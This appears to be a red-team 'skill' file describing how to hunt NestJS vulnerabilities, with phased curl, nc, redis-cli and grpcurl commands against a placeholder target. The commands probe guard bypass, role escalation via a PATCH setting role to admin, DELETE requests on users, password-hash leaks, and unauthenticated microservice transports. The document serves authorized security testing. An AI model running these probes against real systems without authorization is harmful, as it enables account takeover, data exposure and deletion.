---
name: hunt-nestjs
description: Hunt NestJS-specific vulnerabilities: guard bypass, decorator gaps, and microservice auth drift.
category: redteam
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, nestjs, TypeScript, decorator, guard, microservice, GraphQL]
  category: redteam
  related_skills:
    - hunt-graphql
    - hunt-api-misconfig
    - hunt-idor
    - hunt-write-gap
---

# NestJS Security Hunting

Hunt NestJS-specific vulnerabilities in guard bypass via decorator stack gaps, Reflector metadata mismatches between global/controller/method guards, ValidationPipe whitelist and transform exploits, and microservice transport authentication drift. NestJS's architectural patterns — decorators, dependency injection, module system, multi-transport support — create unique attack surface across HTTP, WebSocket, and RPC transports.

## When to Use

- Target uses NestJS (indicated by `x-powered-by: NestJS` or TypeScript decorator patterns in error messages).
- GraphQL endpoints exist alongside REST API.
- Microservice transports (TCP, Redis, NATS, MQTT, gRPC) are configured.
- Swagger/OpenAPI docs are exposed at `/api` or `/api-json`.
- CRUD endpoints follow predictable NestJS naming conventions.

## Quick Detection

```bash
# NestJS fingerprinting
curl -skI "https://target.com/api" | grep -iE "x-powered-by|server"
# Look for: x-powered-by: NestJS

# Swagger docs
curl -sk "https://target.com/api" -w "%{http_code}\n" -o /dev/null
curl -sk "https://target.com/api-json" | jq '.paths | keys[]' 2>/dev/null
```

## Procedure

### Phase 1 — Guard Bypass via Decorator Stack Gaps

```bash
# NestJS guard resolution: global → controller → method
# A @Public() or @SkipAuth() on one method doesn't affect others
# BUT: route parameter confusion can bypass guards

# Test all HTTP methods on guarded endpoints
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl -sk -X "$method" "https://target.com/api/admin/users" \
    -w "$method — %{http_code}\n" -o /dev/null
done

# Controller-level guard with method-level override
curl -sk "https://target.com/api/admin/health"     # may be @Public
curl -sk "https://target.com/api/admin/config"     # may be @Public
```

### Phase 2 — Reflector Metadata Mismatches

```bash
# Global guard checks @Roles() metadata
# But controller-level guard may use different metadata key
# This creates gaps where global guard has no metadata to check → passes

# Test endpoints with different role requirements
curl -sk "https://target.com/api/users" -H "Authorization: Bearer TOKEN" \
  -w "GET users — %{http_code}\n" -o /dev/null

curl -sk -X DELETE "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" \
  -w "DELETE user — %{http_code}\n" -o /dev/null

# Custom parameter decorators may bypass guard checks
curl -sk "https://target.com/api/users?userId=VICTIM_ID" \
  -H "Authorization: Bearer TOKEN" \
  -w "param decorator — %{http_code}\n" -o /dev/null
```

### Phase 3 — ValidationPipe Exploitation

```bash
# ValidationPipe with whitelist: true strips unknown fields
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isAdmin":true}'   # isAdmin stripped if not in DTO

# BUT: transform: true enables implicit type conversion
# Primitive types auto-converted → string "true" → boolean true
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isActive":"true"}'  # string coerced to boolean

# ValidationPipe with skipMissingProperties: true
# PATCH with only the fields you want to change — skips validation of missing fields
curl -sk -X PATCH "https://target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'  # only role updated, no other validation
```

### Phase 4 — Serialization Leaks

```bash
# ClassSerializerInterceptor absence — returns full entity
# With interceptor: returns only @Expose() fields
# Without interceptor: returns ALL entity fields including password hash

curl -sk "https://target.com/api/users/1" | jq 'keys' 2>/dev/null
# Look for: password, passwordHash, secretKey, internalNotes, etc.

# @Exclude() on entity but interceptor not applied globally
# → controller without interceptor leaks excluded fields
```

### Phase 5 — Microservice Transport Auth Drift

```bash
# NestJS microservices support multiple transports
# Auth enforced on HTTP may be absent on TCP/Redis/NATS

# TCP transport (default port 3000)
echo '{"pattern":"getUser","data":{"id":1}}' | nc target.com 3000

# Redis transport — check if Redis is exposed
redis-cli -h target.com PUBLISH "get_user" '{"id":1}'

# gRPC transport — check reflection
grpcurl -plaintext target.com:5000 list

# @MessagePattern without @UseGuards()
# → microservice handler has no authentication at all
```

### Phase 6 — Module Boundary Leaks

```bash
# @Global() modules export providers to all other modules
# If AuthModule is @Global(), token validation available everywhere
# BUT: some modules may import AuthModule manually and use a WEAKER guard

# CRUD generator auto-endpoints
# nestjsx/crud creates standard CRUD without explicit @UseGuards()
curl -sk "https://target.com/api/users"           # GET all
curl -sk "https://target.com/api/users/1"         # GET one
curl -sk -X POST "https://target.com/api/users"   # CREATE
curl -sk -X PATCH "https://target.com/api/users/1" # UPDATE
curl -sk -X DELETE "https://target.com/api/users/1" # DELETE
```

## Pitfalls

- **NestJS Swagger module may expose all endpoints regardless of auth.** Always check `/api-json` for hidden endpoints.
- **`@Public()` decorator is framework-specific (not built into NestJS).** Different projects use `@SkipAuth()`, `@NoAuth()`, or `@AllowAnonymous()`.
- **Microservice transports often run on internal ports.** Test from within the target network if possible.
- **`@Res({ passthrough: true })` bypasses the standard response pipeline.** Response headers and status codes can be injected.

## Verification

1. An endpoint with `@UseGuards(AuthGuard)` at controller level accepts requests at method level without auth.
2. Serializer interceptor absence reveals internal fields (password hash, internal notes, tokens).
3. Microservice handler processes requests without any authentication while HTTP equivalent requires JWT.
4. CRUD auto-endpoints expose create/update/delete operations without explicit authorization.

## Related Skills

- **`hunt-graphql`** — NestJS GraphQL endpoints with @nestjs/graphql decorators.
- **`hunt-api-misconfig`** — Broader API misconfigurations including guard and pipe gaps.
- **`hunt-idor`** — Object-level authorization through NestJS parameter decorators.
- **`hunt-write-gap`** — NestJS PATCH endpoints that accept writes without read authorization.
